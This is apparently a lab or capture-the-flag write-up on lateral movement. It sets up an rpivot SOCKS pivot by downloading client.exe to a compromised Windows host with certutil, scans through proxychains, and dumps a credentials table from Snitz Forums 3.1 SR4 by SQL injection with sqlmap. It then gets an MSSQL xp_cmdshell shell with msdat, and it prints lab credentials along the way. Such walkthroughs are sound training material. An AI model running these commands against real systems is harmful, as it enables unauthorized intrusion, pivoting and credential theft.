# Lateral Movement 1 - Forum & DB

- [Lateral Movement 1 - Forum & DB](#lateral-movement-1---forum--db)
  - [Neighbor discovery](#neighbor-discovery)
  - [Proxy using rpivot](#proxy-using-rpivot)
  - [Enumeration](#enumeration)
  - [10.1.3.1 - Gitlab / Jenkins](#10131---gitlab--jenkins)
  - [10.1.3.2 - Snitz Forums](#10132---snitz-forums)
  - [Getting a shell](#getting-a-shell)

----

## Neighbor discovery

On the Scientist machine, do a `arp` to discover the neighbour:

```
arp -a
```

![picture 28](images/6f3745a7e9de4b5df226dab4540ce0524b58902faa94351e73d9b9133e427b5a.png)  

<br/>

## Proxy using rpivot

On the attacker machine, first clone the repo:

```
git clone https://github.com/klsecservices/rpivot.git
```

Also download the rpivot Windows client executable:

```
cd /usr/share/rpivot/ && wget https://github.com/klsecservices/rpivot/releases/download/v1.0/client.exe
```

![picture 23](images/69e0242b39fb852b687d019571ff77e87b48682fc608be5661dfc5783cd8abcc.png)  

<br/>

Serve `client.exe` using python http server and download it from the Scientist machine:

```
# Attacker
python3 -m http.server 80
```

```
# Scientist machine
cd C:\Users\Public
certutil -urlcache -f http://192.168.100.11/client.exe .\client.exe
```

![picture 24](images/9cfcd47851566013075f1e860e8ebbac5825adcfee02864665e22016ba763e49.png)  


<br/>

On the attacker machine, launch a rpivot server:

```
python server.py --server-port 8080 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9051
```

Then on the Scientist machine, connect to the rpivot server:

```
client.exe --server-ip 192.168.100.11 --server-port 8080
```

![picture 25](images/7e53d48f497bcadb6162d0fa995054cc4027390e8dad4b9d52913e50588280fe.png)  

![picture 26](images/b6f3223437bec6aeca2571b4d4342092165aa8c602c00302bef65da249ee9eed.png)  

<br/>

Modify `/etc/proxychains.conf` to let it use SOCK4 proxy on port 9051:

![picture 27](images/9bbb14e76912c64a077fbfd3fd4a186cb211f6378387c6ec730ffa8f286d54e8.png)  

<br/>

## Enumeration

Use `proxychains` with `nmap` to enumerate the hosts discovered by `arp`:

```
proxychains nmap -Pn -sT 10.1.3.1-2 -p 22,139,80 --min-rate 10000
```

![picture 29](images/2092306e9323966b62b7ac4d2ad1c64b52854be08e9a1aba033c1036becfbb39.png)  

<br/>

## 10.1.3.1 - Gitlab / Jenkins

Refer to Path 1

<br/>

## 10.1.3.2 - Snitz Forums

Use firefox with foxyproxy pointing to SOCK4 proxy on tcp/9051:

![picture 30](images/7ebb48e1600dc3680de1b4655b5ea2004074b912773850b99196061f6e3ef86b.png)  

Use the obtained IIS credential:
`iisadmin` \ `Head!!S%$#@!`

![picture 31](images/4b0f1b05208ffcd5d1b5149b0b5ca5aa72bc4359deb8dab8f2a48be6d95692d1.png)  

![picture 32](images/d319517e43ca033bb25895c312302828afed15dbb337df1d1af0b5612c9b21be.png)  

* Web App Version:  Snitz Forums 2000 Version 3.1 SR4

<br/>

This particular version is known to have an SQL injection exploit:

- https://www.exploit-db.com/exploits/3321

<br/>

With the valid header, use `sqlmap` to exploit. First list the available databases:

![picture 33](images/ac442fee8d3237c60b03520385cccb7d3ffc8eb00fed062bb4c63df58a48a218.png)  


```
proxychains sqlmap -u "http://10.1.3.2/pop_profile.asp?mode=display&id=1" --headers="Authorization: Basic aWlzYWRtaW46SGVhZCEhUyUkI0Ah\nCookie: ASPSESSIONIDCSQSSSRC=JOMBGJJBAPLHBCAKFGBCBFJO" -p id -T U --dbs
```

![picture 34](images/39c7b6a8694264f90257b215c952a13a6600b00f4de9f64567e683f15d811b55.png)  

<br/>

Check the tables in the DB `Sensitive-DB`:

```
proxychains sqlmap -u "http://10.1.3.2/pop_profile.asp?mode=display&id=1" --headers="Authorization: Basic aWlzYWRtaW46SGVhZCEhUyUkI0Ah\nCookie: ASPSESSIONIDCSQSSSRC=JOMBGJJBAPLHBCAKFGBCBFJO" -p id -T U -D Sensitive-DB --tables
```

![picture 35](images/256780fc91bceab6687128a4577a4185ffa818d5bd9508aeda0f5fe1e1ef8a71.png)  

<br/>

Check the table `Creds`:

```
proxychains sqlmap -u "http://10.1.3.2/pop_profile.asp?mode=display&id=1" --headers="Authorization: Basic aWlzYWRtaW46SGVhZCEhUyUkI0Ah\nCookie: ASPSESSIONIDCSQSSSRC=JOMBGJJBAPLHBCAKFGBCBFJO" -p id -T U -D Sensitive-DB -T Creds --dump --threads 10
```

![picture 37](images/20a9e291046b9086a8d36b358dfca3561ced043b454dfbb5e8c426ea1488a913.png)  

- Note that `sa` is the root user of MSSQL database.
  - `sa` / `SAAdmin!@#$%`

<br/>

## Getting a shell

First on the attacker machine, clone `MSDAT`:<br/>
https://github.com/quentinhardy/msdat

```
cd /usr/share && git clone https://github.com/quentinhardy/msdat.git
```

<br/>

Use `virtualenv` to run:

```
cd /usr/share/msdat
virtualenv --python=/usr/bin/python2 .
```

<br/>

Install the dependencies:

```
sudo apt install freetds-dev -y
pip install cython colorlog termcolor pymssql argparse
pip install argcomplete && sudo activate-global-python-argcomplete
```

<br/>

Use `msdat.py` to obtain a xpcmdshell:<br/>
(*Note: This weird command comes from the msdat.dit Github page; it is in fact re-enabling xpcmdshell.*)
```
proxychains python msdat.py xpcmdshell -s 10.1.3.2 -p 1433 -U sa -P 'SAAdmin!@#$%' --enable-xpcmdshell --disable-xpcmdshell --disable-xpcmdshell --shell
```

![picture 39](images/ddb862a847c7fe90d012306fc3f21f054553d714446573653a4b9527c339a4f6.png)  
  

<br/>



